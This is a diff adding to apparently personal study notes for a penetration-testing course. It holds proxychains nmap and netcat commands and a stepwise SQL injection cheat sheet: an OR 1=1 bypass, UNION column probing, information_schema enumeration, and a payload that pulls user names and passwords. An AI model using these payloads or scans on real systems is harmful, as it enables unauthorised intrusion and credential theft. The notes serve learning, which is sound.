@@ -59,3 +59,26 @@ HTML - Markup language for browser interpretation of webpages
 *sudo proxychains nmap -Pn -T4 -sT -p1-10000 <ip> 2>/dev/null*
 *sudo proxychains nmap -Pn -T4 -sT -p80,8080 <ip> --script http-enum.nse|smb-os-discovery.nse 2>/dev/null*
 *proxychains nc <ip> <p#>*
+
+Web Exploitation (SQL):
+Structured Query Language - ANSI Standard
+Commands added by vendors
+  Select/Union
+Relational
+
+3 Default Databases:
+information_schema
+mysql
+performance_schema
+
+SHOW DATABASE;
+USE <database>;
+show tables;
+select * from <dtbse>.<ssn>;
+
+SQL Injection:
+Step 1 - 'OR 1='1
+Step 2 - UNION SELECT #,#,#,#;
+**** Step 3 (Golden Statement) - UNION SELECT table_schema,table_name,column_name FROM information_schema.columns;# ****
+Step 4 - UNION SELECT id,2,name,pass,5 FROM session.user;#
+Step 5 - UNION SELECT tireid,2,name,size,cost FROM session.Tires;#
